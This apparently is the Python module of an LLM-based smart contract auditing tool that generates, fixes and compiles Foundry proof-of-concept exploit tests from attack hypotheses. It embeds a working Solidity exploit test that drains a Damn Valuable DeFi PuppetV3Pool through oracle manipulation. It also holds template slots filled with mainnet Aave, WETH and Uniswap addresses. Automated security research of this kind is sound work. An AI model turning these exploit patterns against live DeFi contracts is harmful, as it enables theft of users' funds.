"""poc generator for attack hypotheses"""
import json
import os
import re
import subprocess
import textwrap
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Set, Tuple

from config import config
from utils.llm_backend import LLMBackend
from utils.logging import ResearchLogger
from utils.cost_manager import CostManager
from utils.source_snippets import gather_relevant_snippets
from agent.base_attacker import AttackHypothesis
from agent.prompts.poc_prompts import (
    POC_SYSTEM_PROMPT,
    POC_FLASH_LOAN_GUIDANCE,
    POC_REENTRANCY_GUIDANCE,
    POC_ORACLE_GUIDANCE,
    POC_ACCESS_CONTROL_GUIDANCE,
    POC_INTEGRATION_MODE_GUIDANCE,
)
from .llm_sanitizer import sanitize_poc
from .poc_fixers import apply_poc_fixers
from .poc_templates import get_template_library, PoCTemplate
from pydantic import BaseModel, Field, ConfigDict


class PoCGenerationError(Exception):
    """poc generation failure"""
    def __init__(self, hypothesis: AttackHypothesis, reason: str):
        self.hypothesis = hypothesis
        self.reason = reason
        super().__init__(f"PoC failed {hypothesis.hypothesis_id}: {reason}")


ENGINE_VERSION = "pocgen/2.0.0"
DEFAULT_POC_CONTEXT_CHARS = int(os.getenv("POC_CONTEXT_CHARS", "20000"))

MODULE_IMPORTS: Dict[str, str] = {
    "CrossDomainHarness": 'import {CrossDomainHarness} from "src/poc/modules/CrossDomainHarness.sol";',
    "MerkleForge": 'import {MerkleForge} from "src/poc/modules/MerkleForge.sol";',
    "BridgeFinalizer": 'import {BridgeFinalizer} from "src/poc/modules/BridgeFinalizer.sol";',
    "EIP1271Harness": 'import {EIP1271Harness} from "src/poc/modules/EIP1271Harness.sol";',
    "ERC721Reenter": 'import {ERC721Reenter} from "src/poc/modules/ERC721Reenter.sol";',
    "ERC1155Reenter": 'import {ERC1155Reenter} from "src/poc/modules/ERC1155Reenter.sol";',
    "CalldataForge": 'import {CalldataForge} from "src/poc/modules/CalldataForge.sol";',
    "Create2Factory": 'import {Create2Factory} from "src/poc/modules/Create2Factory.sol";',
    "SelfDestructPay": 'import {SelfDestructPay} from "src/poc/modules/SelfDestructPayer.sol";',
    "DelegateCaller": 'import {DelegateCaller} from "src/poc/modules/DelegateCaller.sol";',
    "ForkControl": 'import {ForkControl} from "src/poc/modules/ForkControl.sol";',
    "EventsRecord": 'import {EventsRecord} from "src/poc/modules/EventsRecord.sol";',
    "EventsCollect": 'import {EventsCollect} from "src/poc/modules/EventsCollect.sol";',
    "DiffAssert": 'import {DiffAssert} from "src/poc/modules/DiffAssert.sol";',
    "V3OracleMock": 'import {V3OracleMock} from "src/poc/modules/V3OracleMock.sol";',
    "V3Twap": 'import {V3Twap} from "src/poc/modules/V3Twap.sol";',
}


class _PoCResponse(BaseModel):
    """llm poc response schema"""
    test_code: str = Field(..., description="Complete Foundry test code.")
    exploit_contract: Optional[str] = Field(default=None, description="Helper contract code or `None`.")
    impact_summary: str = Field(..., description="Plain-language exploit summary.")
    model_config = ConfigDict(extra="allow")


def _imports_for(modules: Iterable[str]) -> str:
    items: List[str] = []
    seen: Set[str] = set()
    for module in modules:
        imp = MODULE_IMPORTS.get(module)
        if not imp or imp in seen:
            continue
        items.append(imp)
        seen.add(imp)
    return "\n".join(items)


def _sanitize_identifier(name: str) -> str:
    sanitized = re.sub(r"[^a-zA-Z0-9_]", "_", name or "")
    if not sanitized:
        return "tempVar"
    if sanitized[0].isdigit():
        sanitized = f"_{sanitized}"
    return sanitized


def _sanitize_contract_name(raw: str) -> str:
    tokens = re.split(r"[^a-zA-Z0-9]+", raw)
    cleaned = "".join(token.capitalize() for token in tokens if token)
    return cleaned or "AutoPoC"


def _extract_solidity_version(source: str) -> Optional[Tuple[int, int, int]]:
    """extract solidity version from pragma"""
    match = re.search(r'pragma\s+solidity\s*[^\d]*(\d+)\.(\d+)\.?(\d+)?', source, re.IGNORECASE)
    if match:
        major = int(match.group(1))
        minor = int(match.group(2))
        patch = int(match.group(3)) if match.group(3) else 0
        return (major, minor, patch)
    return None


def _is_solidity_version_compatible(version: Tuple[int, int, int]) -> bool:
    """check version compatibility with 0.8.25 harness"""
    major, minor, _ = version
    return major == 0 and minor >= 7


@dataclass
class GeneratedPoC:
    """generated proof of concept"""
    hypothesis_id: str
    contract_code: str
    test_code: str
    file_path: Path
    generation_method: str
    cost: float


def render_manifest_test(manifest: Dict[str, Any]) -> str:
    """deterministic fallback renderer for immunefi mode"""
    contract_name = _sanitize_contract_name(manifest.get("name", "ImmunefiAuto")) + "Manifest"
    modules = manifest.get("modules") or []
    constants = manifest.get("constants") or {}
    fork_block = manifest.get("fork_block")
    fork_time = manifest.get("fork_timestamp")
    steps = (manifest.get("strategy") or {}).get("steps") or []

    module_imports = _imports_for(modules)
    manifest_summary = {
        "modules": modules,
        "constants": constants,
        "steps": steps,
    }
    steps_json = json.dumps(manifest_summary, indent=2, sort_keys=True)
    comment_block = "\n".join(f"        // {line}" for line in steps_json.splitlines())

    header_imports = [
        'import {ExploitTestBase} from "src/poc/ExploitTestBase.sol";',
        module_imports,
    ]
    header_imports = "\n".join(line for line in header_imports if line)

    fork_lines: List[str] = []
    if isinstance(fork_block, int) and fork_block > 0:
        fork_lines.append(f"        vm.roll({fork_block});")
    if isinstance(fork_time, int) and fork_time > 0:
        fork_lines.append(f"        vm.warp({fork_time});")

    fork_block_str = "\n".join(fork_lines) or "        // No fork metadata supplied"

    helper_lines: List[str] = []
    module_set = set(modules)
    if "V3OracleMock" in module_set:
        helper_lines.append("        V3OracleMock oracle = new V3OracleMock();")
        helper_lines.append("        oracle.setMeanTick(-830000);")
    if "V3Twap" in module_set:
        helper_lines.append("        address baseTok = makeAddr(\"BASE_ASSET\");")
        helper_lines.append("        address quoteTok = makeAddr(\"QUOTE_ASSET\");")
        helper_lines.append("        V3Twap.quote(address(oracle), 600, baseTok, quoteTok, 1 ether);")
    helper_block = "\n".join(helper_lines) or "        // (no helper modules used)"

    return (
        "// SPDX-License-Identifier: MIT\n"
        "pragma solidity 0.8.25;\n\n"
        f"{header_imports}\n\n"
        f"contract {contract_name} is ExploitTestBase {{\n"
        "    function setUp() public override {\n"
        "        super.setUp();\n"
        f"{fork_block_str}\n"
        "    }\n\n"
        "    function test_manifest_strategy() public {\n"
        f"{comment_block or '        // (manifest empty)'}\n"
        f"{helper_block}\n"
        "        // Explicitly fail to avoid false validation when AI path is unavailable.\n"
        "        // Placeholder manifest test (no-op)\n"
        "    }\n"
        "}\n"
    )


def generate_llm_fallback(manifest: Dict[str, Any]) -> str:
    """compatibility helper"""
    return render_manifest_test(manifest)


class PoCGenerator:
    """generates foundry test pocs for attack hypotheses"""

    _HARNESS_HEADER = (
        "// SPDX-License-Identifier: MIT\n"
        "pragma solidity 0.8.25;\n"
        'import {ExploitTestBase} from "src/poc/ExploitTestBase.sol";\n'
    )

    def _remap_import(self, target: str) -> str:
        if target.startswith("src/poc"):
            return target
        dvd_prefix = "training/damn-vulnerable-defi/"
        if target.startswith(dvd_prefix + "src/"):
            # preserve src/ in the remapped path since dvd/ maps to dvd root
            return "dvd/src/" + target[len(dvd_prefix + "src/"):]
        if target.startswith(dvd_prefix + "lib/"):
            return "dvd/lib/" + target[len(dvd_prefix + "lib/"):]
        if target.startswith(dvd_prefix):
            return "dvd/" + target[len(dvd_prefix):]
        if target.startswith("src/"):
            return "dvd/src/" + target[4:]
        return target

    def _finalize_code(self, code: str, contract_info: Optional[Dict[str, Any]] = None) -> str:
        text = code.strip()
        # strip spdx, pragma, and exploittestbase import (we'll re-add them)
        text = re.sub(r"^// SPDX[^\n]*\n", "", text, count=1, flags=re.MULTILINE)
        text = re.sub(r"^pragma\s+solidity\s+[^;]+;\s*", "", text, count=1, flags=re.MULTILINE)
        text = re.sub(r'^import\s+[^;]*ExploitTestBase[^;]*;\s*', "", text, count=1, flags=re.MULTILINE)

        # remove any existing target contract imports (we'll add the canonical one)
        target_name = contract_info.get("name") if contract_info else None
        if target_name:
            # remove all imports of the target contract
            text = re.sub(
                rf'^import\s+{{[^}}]*{re.escape(target_name)}[^}}]*}}[^;]*;\s*',
                "",
                text,
                flags=re.MULTILINE
            )

        # remove redeclared attacker variable (exploittestbase already provides it)
        text = re.sub(
            r'^\s*address\s+(public\s+|private\s+|internal\s+)?attacker\s*[;=][^\n]*\n',
            "",
            text,
            flags=re.MULTILINE
        )

        # add override keyword to setup() if missing
        text = re.sub(
            r'(function\s+setUp\s*\(\s*\)\s+public)\s+{',
            r'\1 override {',
            text
        )

        # ensure super.setup() is called as first line in setup()
        setup_match = re.search(r'function\s+setUp\s*\([^)]*\)\s+public\s+override\s*\{([^}]+)\}', text, re.DOTALL)
        if setup_match:
            setup_body = setup_match.group(1)
            if 'super.setUp()' not in setup_body:
                # insert super.setup() as first line
                text = re.sub(
                    r'(function\s+setUp\s*\([^)]*\)\s+public\s+override\s*\{)',
                    r'\1\n        super.setUp();',
                    text,
                    count=1
                )

        # replace targetcontract.constant with target.constant (instance access)
        if target_name:
            # replace type.constant with instance.constant
            text = re.sub(
                rf'\b{re.escape(target_name)}\.([A-Z_][A-Z0-9_]*)\b',
                r'target.\1',
                text
            )

        # remap remaining imports
        import_pattern = re.compile(r'(import\s+[^"]*")([^"]+)("\s*;)')

        def _replace(match: re.Match) -> str:
            return match.group(1) + self._remap_import(match.group(2)) + match.group(3)

        text = import_pattern.sub(_replace, text)

        # prune helper contracts: keep the contract that inherits exploittestbase (or the first one)
        text = self._prune_contracts(text)

        # build canonical target import
        target_import_stmt = ""
        if contract_info:
            source_import = contract_info.get("source_import")
            if source_import and target_name:
                remapped = self._remap_import(source_import)
                target_import_stmt = f'import {{{target_name}}} from "{remapped}";\n'

        header = (
            "// SPDX-License-Identifier: MIT\n"
            "pragma solidity 0.8.25;\n"
            'import {ExploitTestBase} from "src/poc/ExploitTestBase.sol";\n'
            f"{target_import_stmt}"
        )

        body = text.strip()
        if body and not body.endswith("\n"):
            body += "\n"
        return header + body

    def _prune_contracts(self, text: str) -> str:
        """keep only primary test contract inheriting exploittestbase"""
        pattern = re.compile(r"^\s*contract\s+([A-Za-z0-9_]+)[^{]*\{", re.MULTILINE)
        matches = list(pattern.finditer(text))
        if len(matches) <= 1:
            return text

        def find_end(start_idx: int) -> int:
            depth = 0
            for i in range(start_idx, len(text)):
                ch = text[i]
                if ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 0:
                        return i + 1
            return len(text)

        keep_idx = 0
        for idx, m in enumerate(matches):
            line = text[m.start(): text.find("\n", m.start()) if "\n" in text[m.start():] else len(text)]
            if "ExploitTestBase" in line:
                keep_idx = idx
                break

        keep_match = matches[keep_idx]
        keep_start = keep_match.start()
        keep_end = find_end(keep_match.start())

        return text[keep_start:keep_end]

    @staticmethod
    def _has_impact_signal(solidity_code: str) -> bool:
        tokens = ("logProfit(", "markImpact(", "markAuthzBypass(")
        return any(token in solidity_code for token in tokens)

    def _ensure_impact_signal(self, solidity_code: str) -> str:
        if self._has_impact_signal(solidity_code):
            return solidity_code

        statement = 'markImpact("MARKET_CORRUPTION");'

        def _inject_once(match: re.Match) -> str:
            leading_ws = re.match(r"\s*", match.group(0)).group(0)
            return f"{leading_ws}{statement}\n{match.group(0)}"

        new_code, count = re.subn(r"\s*stopAs\s*\(\s*\)\s*;", _inject_once, solidity_code, count=1)
        if count == 0:
            injected = self._inject_impact_into_block(solidity_code, statement)
            if injected is None:
                self.logger.warning(
                    "[PoCGenerator] Impact tag missing but could not inject markImpact safely."
                )
                return solidity_code
            new_code = injected

        self.logger.warning("[PoCGenerator] Impact tag missing; injected markImpact(\"MARKET_CORRUPTION\").")
        return new_code

    def _inject_impact_into_block(self, solidity_code: str, statement: str) -> Optional[str]:
        for pattern in [
            r"function\s+test[A-Za-z0-9_]*\s*\([^)]*\)\s*[^{}]*\{",
            r"function\s+setUp\s*\([^)]*\)\s*[^{}]*\{",
            r"function\s+[A-Za-z0-9_]+\s*\([^)]*\)\s*[^{}]*\{",
        ]:
            match = re.search(pattern, solidity_code)
            if not match:
                continue
            brace_idx = solidity_code.find("{", match.start())
            if brace_idx == -1:
                continue
            block_end = self._find_block_end(solidity_code, brace_idx)
            if block_end is None:
                continue
            indent = self._indent_for_insertion(solidity_code, block_end)
            injected = f"{solidity_code[:block_end]}{indent}{statement}\n{solidity_code[block_end:]}"
            return injected
        return None

    @staticmethod
    def _find_block_end(source: str, open_brace_idx: int) -> Optional[int]:
        depth = 0
        for idx in range(open_brace_idx, len(source)):
            ch = source[idx]
            if ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
                if depth == 0:
                    return idx
        return None

    @staticmethod
    def _indent_for_insertion(source: str, insert_idx: int) -> str:
        line_start = source.rfind("\n", 0, insert_idx)
        if line_start == -1:
            base_indent = ""
        else:
            line_start += 1
            line_segment = source[line_start:insert_idx]
            match = re.match(r"[ \t]*", line_segment)
            base_indent = match.group(0) if match else ""
        return f"{base_indent}    "

    def _validate_test_code(self, solidity_code: str, contract_info: Dict[str, Any]) -> List[str]:
        issues: List[str] = []
        target_name = contract_info.get("name")
        source_import = contract_info.get("source_import")
        if target_name and source_import:
            required = f'import {{{target_name}}} from "{self._remap_import(source_import)}";'
            if required not in solidity_code:
                issues.append(f"Missing required target import `{required}`.")
        code_without_imports = re.sub(r'^\s*import\s+.*?;', '', solidity_code, flags=re.MULTILINE)
        contract_defs = re.findall(r"^\s*contract\s+([A-Za-z0-9_]+)", code_without_imports, re.MULTILINE)
        if len(contract_defs) > 1:
            issues.append(f"Multiple contracts: {', '.join(contract_defs)}. Keep only test contract.")
        if target_name:
            type_usage = re.search(rf"\b{re.escape(target_name)}\s+[A-Za-z_]\w*", solidity_code)
            instantiation = re.search(rf"\bnew\s+{re.escape(target_name)}\b", solidity_code)
            if not type_usage and not instantiation:
                issues.append(f"PoC does not instantiate `{target_name}`.")
        if " is ExploitTestBase" not in solidity_code:
            issues.append("Test must inherit `ExploitTestBase`.")
        if re.search(r"^\s*address\s+(public\s+|private\s+|internal\s+)?attacker\s*[;=]", solidity_code, re.MULTILINE):
            issues.append("Do NOT redeclare `attacker` (ExploitTestBase provides it).")
        if re.search(r"function\s+setUp\s*\(\s*\)\s+public\s+(?!override)", solidity_code):
            issues.append("setUp() needs `override` and `super.setUp();`")
        return issues

    def __init__(self, backend: LLMBackend, logger: ResearchLogger, cost_manager: CostManager,
                 output_dir: Optional[str] = None, mode: str = "ai"):
        """initialize poc generator"""
        if output_dir is None:
            from config import config
            output_dir = str(config.POC_OUTPUT_DIR)
        self.backend = backend
        self.logger = logger
        self.cost_manager = cost_manager
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.mode = "auto" if mode == "auto" else "ai"
        self.logger.info(f"[PoCGenerator] Initialized (mode: {self.mode})")

    def generate(self, hypothesis: AttackHypothesis, contract_source: str, contract_info: Dict[str, Any],
                 integration_mode: bool = False) -> Optional[GeneratedPoC]:
        """generate poc for attack hypothesis"""
        self.logger.info(f"[PoCGenerator] Generating PoC for: {hypothesis.description[:100]}... (integration={integration_mode})")
        contract_version = _extract_solidity_version(contract_source)
        if contract_version and not _is_solidity_version_compatible(contract_version):
            version_str = f"{contract_version[0]}.{contract_version[1]}.{contract_version[2]}"
            self.logger.warning(f"[PoCGenerator] Skipping - Solidity {version_str} incompatible (need >=0.7.0)")
            raise PoCGenerationError(hypothesis, f"Solidity {version_str} incompatible (need >=0.7.0)")
        if self.mode == "auto":
            return self._generate_auto_plan(hypothesis, contract_info)
        return self._generate_ai(hypothesis, contract_source, contract_info, integration_mode)

    def _try_template_generation(self, hypothesis: AttackHypothesis, contract_info: Dict[str, Any],
                                  integration_mode: bool = False) -> Optional[GeneratedPoC]:
        """template-based poc generation"""
        if integration_mode:
            return None
        library = get_template_library()
        template = library.match_hypothesis(hypothesis)
        if not template:
            return None
        self.logger.info(f"[PoCGenerator] Matched template: {template.name} ({template.vuln_type.value})")
        context = self._extract_template_context(hypothesis, contract_info, template)
        try:
            test_code = library.fill_template(template, context)
        except Exception as exc:
            self.logger.warning(f"[PoCGenerator] Template filling failed: {exc}")
            return None
        test_code = self._finalize_code(test_code, contract_info)
        test_code = self._ensure_impact_signal(test_code)
        validation_errors = self._validate_test_code(test_code, contract_info)
        if validation_errors:
            self.logger.warning(f"[PoCGenerator] Template validation failed: {'; '.join(validation_errors[:3])}")
            return None
        file_path = self.output_dir / f"{hypothesis.hypothesis_id}_template_poc.sol"
        file_path.write_text(test_code, encoding="utf-8")
        ok, compile_err = self._compile_solidity(file_path)
        if not ok:
            self.logger.warning(f"[PoCGenerator] Template compilation failed: {compile_err[:200]}")
            fixed_code, fixes = apply_poc_fixers(test_code, compile_err or "", contract_info)
            if fixes:
                file_path.write_text(fixed_code, encoding="utf-8")
                ok_fixed, _ = self._compile_solidity(file_path)
                if ok_fixed:
                    test_code = fixed_code
                    self.logger.info(f"[PoCGenerator] Template fixers: {', '.join(fixes)}")
                else:
                    return None
            else:
                return None
        self.logger.info(f"[PoCGenerator] Template PoC saved to: {file_path}")
        return GeneratedPoC(hypothesis_id=hypothesis.hypothesis_id, contract_code="", test_code=test_code,
                           file_path=file_path, generation_method="template", cost=0.0)

    def _extract_template_context(self, hypothesis: AttackHypothesis, contract_info: Dict[str, Any],
                                   template: PoCTemplate) -> Dict[str, str]:
        """extract context for template placeholders"""
        context = {}
        context["TARGET_CONTRACT"] = contract_info.get("name", "Target")
        context["TARGET_PATH"] = self._remap_import(
            contract_info.get("source_import", contract_info.get("path", "src/Target.sol")))
        target_func = hypothesis.target_function or ""
        func_name = target_func.split("(")[0] if "(" in target_func else (target_func or "vulnerableFunction")
        context["VULNERABLE_FUNCTION"] = func_name
        args = ""
        for step in hypothesis.steps:
            if func_name in step and "(" in step:
                match = re.search(rf"{re.escape(func_name)}\s*\(([^)]*)\)", step)
                if match:
                    args = match.group(1).strip()
                    break
        context["FUNCTION_ARGS"] = context["REENTRY_ARGS"] = args or ""
        setup_lines = [f'target = new {context["TARGET_CONTRACT"]}();'] if "new " + context["TARGET_CONTRACT"] in hypothesis.description or not hypothesis.steps else [f'target = {context["TARGET_CONTRACT"]}(TARGET_ADDRESS);']
        context["SETUP_TARGET"] = "\n        ".join(setup_lines)
        initial_balance = "10 ether"
        exploit_funding = "1 ether"
        for precond in hypothesis.preconditions:
            balance_match = re.search(r"(\d+\.?\d*)\s*(ether|wei|gwei)", precond.lower())
            if balance_match:
                amount, unit = balance_match.group(1), balance_match.group(2)
                initial_balance = f"{amount} {unit}"
                try:
                    exploit_funding = f"{float(amount) / 10} {unit}"
                except ValueError:
                    pass
                break
        context["INITIAL_BALANCE"] = initial_balance
        context["EXPLOIT_FUNDING"] = exploit_funding
        context["BALANCE_CHECK"] = "address(target).balance"
        state_setup_lines = [f"// {p}" for p in hypothesis.preconditions if "deposit" in p.lower() or "fund" in p.lower()]
        context["SETUP_STATE"] = "\n        ".join(state_setup_lines) if state_setup_lines else "// no additional setup"
        context.update({
            "AAVE_POOL_ADDRESS": "0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9",
            "TOKEN_ADDRESS": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
            "FORK_RPC": '"mainnet"',
            "FLASH_AMOUNT": "1000 ether",
            "EXPLOIT_LOGIC": "// manipulation logic here",
            "PAIR_ADDRESS": "0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852",
            "AMOUNT0": "1000 ether",
            "AMOUNT1": "0",
            "ORACLE_ADDRESS": "0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419",
            "STALENESS_PERIOD": "1 days",
            "SWAP_AMOUNT": "1000 ether",
            "TWAP_PERIOD": "1 hours",
            "EXPLOIT_CALL": f"target.{func_name}();",
            "INITIAL_STATE_CHECK": "uint256 initialValue = target.value();",
            "PRIVILEGED_CALL": f"target.{func_name}();",
            "FINAL_STATE_CHECK": 'assertTrue(target.value() != initialValue, "State changed");',
            "MESSAGE_HASH": 'keccak256(abi.encodePacked("message"))',
            "FIRST_CALL": f"target.{func_name}(signature);",
            "REPLAY_CALL": f"target.{func_name}(signature);",
            "INITIAL_SETUP": "// setup overflow conditions",
            "OVERFLOW_TRIGGER": f"target.{func_name}(type(uint256).max);"
        })
        return context

    def _generate_auto_plan(self, hypothesis: AttackHypothesis, contract_info: Dict[str, Any]) -> GeneratedPoC:
        """generate autoplan and persist bytes"""
        from agent.plan_synth import build_and_encode
        attacker = "0x00000000000000000000000000000000000000AA"
        encoded = build_and_encode(contract_info, attacker)
        name = _sanitize_contract_name(contract_info.get("name", "Target")).lower()
        out_path = self.output_dir / f"{name}_autoplan.bin"
        out_path.write_bytes(encoded)
        sentinel = f"AUTOPOC_PLAN_BIN:{out_path}"
        return GeneratedPoC(hypothesis_id=hypothesis.hypothesis_id, contract_code="", test_code=sentinel,
                           file_path=out_path, generation_method="autoplan", cost=0.0)

    def _generate_ai(self, hypothesis: AttackHypothesis, contract_source: str, contract_info: Dict[str, Any],
                     integration_mode: bool = False) -> Optional[GeneratedPoC]:
        """generate poc using ai or template"""
        template_result = self._try_template_generation(hypothesis, contract_info, integration_mode)
        if template_result is not None:
            self.logger.info("[PoCGenerator] Template-based generation (0 LLM cost)")
            return template_result
        self.logger.info("[PoCGenerator] No template; using AI generation")
        system_prompt = POC_SYSTEM_PROMPT
        if integration_mode:
            system_prompt += POC_INTEGRATION_MODE_GUIDANCE
        attack_type = hypothesis.attack_type.lower() if hypothesis.attack_type else ""
        if "flash" in attack_type or "loan" in attack_type:
            system_prompt += POC_FLASH_LOAN_GUIDANCE
        elif "reentran" in attack_type:
            system_prompt += POC_REENTRANCY_GUIDANCE
        elif "oracle" in attack_type or "price" in attack_type:
            system_prompt += POC_ORACLE_GUIDANCE
        elif "access" in attack_type or "auth" in attack_type or "privilege" in attack_type:
            system_prompt += POC_ACCESS_CONTROL_GUIDANCE
        compile_feedback: Optional[str] = None
        last_error: Optional[str] = None
        for attempt in range(1, 3):
            prompt = self._build_generation_prompt(hypothesis, contract_source, contract_info, compile_feedback)
            try:
                test_code, exploit_code, response = self._render_poc_from_llm(
                    prompt=prompt, system_prompt=system_prompt, hypothesis=hypothesis, contract_info=contract_info)
            except Exception as exc:
                self.logger.error(f"[PoCGenerator] AI generation failed: {exc}")
                last_error = str(exc)
                compile_feedback = f"validation failed:\n{last_error[:800]}"
                continue
            file_path = self.output_dir / f"{hypothesis.hypothesis_id}_poc.sol"
            file_path.write_text(test_code, encoding="utf-8")
            self.logger.info(f"[PoCGenerator] PoC saved to: {file_path}")
            ok, compile_err = self._compile_solidity(file_path)
            if ok:
                return GeneratedPoC(hypothesis_id=hypothesis.hypothesis_id,
                                   contract_code=exploit_code if exploit_code != "N/A" else "",
                                   test_code=test_code, file_path=file_path, generation_method="ai", cost=response.cost)
            fixed_code, fixes = apply_poc_fixers(test_code, compile_err or "", contract_info)
            if fixes:
                self.logger.warning(f"[PoCGenerator] Apply fixers ({', '.join(fixes)})")
                file_path.write_text(fixed_code, encoding="utf-8")
                ok_fixed, compile_err_fixed = self._compile_solidity(file_path)
                if ok_fixed:
                    return GeneratedPoC(hypothesis_id=hypothesis.hypothesis_id,
                                       contract_code=exploit_code if exploit_code != "N/A" else "",
                                       test_code=fixed_code, file_path=file_path, generation_method="ai+fix", cost=response.cost)
                compile_err = compile_err_fixed or compile_err
            compile_feedback = f"forge build failed:\n{compile_err[:600]}"
            last_error = compile_feedback
            self.logger.warning(f"[PoCGenerator] Compile failed (attempt {attempt}): {compile_err[:200]}")
        self.logger.error(f"[PoCGenerator] Failed to produce compilable PoC: {last_error or 'unknown'}")
        try:
            autoplan = self._generate_auto_plan(hypothesis, contract_info)
            if autoplan:
                self.logger.warning("[PoCGenerator] Fallback to AutoPlan")
                return autoplan
        except (RuntimeError, ValueError, KeyError) as exc:
            self.logger.warning(f"[PoCGenerator] AutoPlan fallback failed: {exc}", exc_info=True)
        return self.generate_llm_fallback(hypothesis, contract_source, contract_info, last_error or "ai_failed")

    def _render_poc_from_llm(
        self,
        *,
        prompt: str,
        system_prompt: str,
        hypothesis: AttackHypothesis,
        contract_info: Dict[str, Any],
    ) -> Tuple[str, str, Any]:
        thinking_type = config.get_thinking_type(getattr(self.backend, "model", config.DEFAULT_MODEL))
        gen_kwargs = dict(
            prompt=prompt,
            system_prompt=system_prompt,
            max_tokens=config.POC_MAX_TOKENS,
            temperature=min(config.POC_TEMPERATURE, 0.3),
            force_reset=True,
        )
        if thinking_type == "extended":
            gen_kwargs["thinking_budget"] = config.POC_THINKING_BUDGET

        response = self.backend.generate(**gen_kwargs)

        self.cost_manager.log_cost(
            agent_name="PoCGenerator",
            contract_name=contract_info.get("name", "current"),
            round_num=0,
            operation="generate_poc",
            cost=response.cost
        )

        self.logger.log_ai_call(
            agent_name="PoCGenerator",
            contract_name=contract_info.get("name", "Unknown"),
            round_num=0,
            event_type="poc_generation",
            prompt=prompt,
            response=response.text,
            thinking=(response.thinking if hasattr(response, "thinking") else None),
            cost=response.cost,
            duration_seconds=0.0,
            model=getattr(self.backend, "model", "unknown"),
            prompt_tokens=getattr(response, "prompt_tokens", 0),
            output_tokens=getattr(response, "output_tokens", 0),
            thinking_tokens=getattr(response, "thinking_tokens", 0)
        )

        test_code = self._extract_code_block(response.text, "TEST_CODE")
        exploit_code = self._extract_code_block(response.text, "EXPLOIT_CONTRACT")

        if not test_code:
            raise ValueError("Failed to extract test code from LLM response")

        test_code = self._rewrite_import_paths(test_code, contract_info)
        test_code = self._finalize_code(test_code, contract_info)
        test_code = self._ensure_impact_signal(test_code)

        validation_errors = self._validate_test_code(test_code, contract_info)
        if validation_errors:
            raise ValueError("PoC validation errors: " + "; ".join(validation_errors))
        return test_code, exploit_code, response

    def generate_llm_fallback(
        self,
        hypothesis: AttackHypothesis,
        contract_source: str,
        contract_info: Dict[str, Any],
        failure_context: str = "",
    ) -> Optional[GeneratedPoC]:
        specialized = self._maybe_specialized_template(contract_info)
        if specialized is not None:
            code = specialized
        else:
            manifest = self._extract_manifest(hypothesis, contract_info)
            if manifest is None:
                manifest_copy: Dict[str, Any] = {
                    "name": f"{hypothesis.hypothesis_id}_Fallback",
                    "modules": [],
                    "strategy": {"steps": []},
                    "constants": {},
                }
            else:
                manifest_copy = dict(manifest)
            manifest_copy.setdefault("name", f"{hypothesis.hypothesis_id}_Fallback")
            if failure_context:
                manifest_copy["failure_context"] = failure_context

            try:
                code = generate_llm_fallback(manifest_copy)
            except (RuntimeError, ValueError) as exc:
                # llm fallback may fail due to api errors or invalid manifest
                self.logger.error(f"[PoCGenerator] Fallback generation failed: {exc}", exc_info=True)
                # raise explicit exception instead of silent none return
                raise PoCGenerationError(
                    hypothesis=hypothesis,
                    reason=f"All generation paths failed: {failure_context}. Final error: {exc}"
                ) from exc

        code = self._finalize_code(code, contract_info)
        code = self._ensure_impact_signal(code)

        file_path = self.output_dir / f"{hypothesis.hypothesis_id}_fallback_poc.sol"
        file_path.write_text(code, encoding="utf-8")

        self.logger.info(f"[PoCGenerator] Fallback PoC saved to: {file_path}")

        ok, compile_err = self._compile_solidity(file_path)
        if not ok:
            self.logger.warning("[PoCGenerator] Fallback PoC failed to compile: %s", compile_err[:400])

        return GeneratedPoC(
            hypothesis_id=hypothesis.hypothesis_id,
            contract_code="",
            test_code=code,
            file_path=file_path,
            generation_method="fallback",
            cost=0.0,
        )

    def _maybe_specialized_template(self, contract_info: Optional[Dict[str, Any]]) -> Optional[str]:
        path_hint = ""
        if isinstance(contract_info, dict):
            path_hint = str(contract_info.get("path") or contract_info.get("file_path") or "")
        if "puppet-v3/PuppetV3Pool.sol" in path_hint:
            return self._render_puppet_v3_template()
        return None

    @staticmethod
    def _render_puppet_v3_template() -> str:
        return textwrap.dedent(
            """
            import {ExploitTestBase} from "src/poc/ExploitTestBase.sol";
            import {PuppetV3Pool} from "dvd/src/puppet-v3/PuppetV3Pool.sol";
            import {DamnValuableToken} from "dvd/src/DamnValuableToken.sol";
            import {WETH} from "dvd/lib/solmate/src/tokens/WETH.sol";
            import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
            import {V3OracleMock} from "src/poc/modules/V3OracleMock.sol";

            contract PuppetV3PriceManipulationTest is ExploitTestBase {
                PuppetV3Pool internal target;
                DamnValuableToken internal token;
                WETH internal weth;
                V3OracleMock internal oracle;

                function setUp() public override {
                    super.setUp();
                    attacker = makeAddr("attacker");
                    token = new DamnValuableToken();
                    weth = new WETH();
                oracle = new V3OracleMock();
                target = new PuppetV3Pool(weth, token, IUniswapV3Pool(address(oracle)));

                    // Seed balances
                    give(address(token), address(target), 1_000_000 ether);
                    give(address(token), attacker, 110 ether);
                    give(address(weth), attacker, 50 ether);

                    startAs(attacker);
                    weth.approve(address(target), type(uint256).max);
                    stopAs();
                }

                function test_exploit() public {
                    startAs(attacker);

                    // Force oracle to return a deeply negative tick so DVT is priced cheaply vs WETH
                    oracle.setMeanTick(-830000);

                    uint256 borrowAmount = token.balanceOf(address(target));
                    uint256 requiredDeposit = target.calculateDepositOfWETHRequired(borrowAmount);
                    require(requiredDeposit < 5 ether, "deposit still expensive");

                    // Pay the tiny collateral and drain the pool
                    target.borrow(borrowAmount);

                    assertEq(token.balanceOf(address(target)), 0);
                    assertGe(token.balanceOf(attacker), borrowAmount);
                    markImpact("MARKET_CORRUPTION");
                    logProfit(uint256(token.balanceOf(attacker)));
                    stopAs();
                }
            }

            """
        ).strip()

    def _extract_manifest(
        self,
        hypothesis: AttackHypothesis,
        contract_info: Dict[str, Any]
    ) -> Optional[Dict[str, Any]]:
        metadata = getattr(hypothesis, "metadata", None)
        if isinstance(metadata, dict):
            manifest = metadata.get("poc_manifest")
